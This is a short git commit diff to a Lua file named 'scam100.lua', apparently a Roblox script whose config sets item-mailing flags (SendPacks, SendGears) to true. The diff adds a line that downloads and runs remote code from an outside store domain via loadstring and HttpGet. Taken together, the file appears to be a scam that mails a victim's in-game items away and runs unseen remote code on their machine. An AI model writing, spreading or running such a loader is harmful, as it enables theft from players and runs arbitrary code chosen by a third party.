1ba2f375a41fa4bad763e86f6261280a37fc76b9
ChalarmZ <keemzanznr4747@gmail.com>
2026-06-16 16:35:20 +0700

    Update scam100.lua

--- scam100.lua
+++ scam100.lua
@@ -7,3 +7,4 @@ getgenv().HB_MailConfig = {
         SendPacks    = true,   
         SendGears    = true,   
     }
+loadstring(game:HttpGet("https://hybrid-e3.store/api/scripts/4a9b943789624a36a3eae49c53f11d60/loader"))()
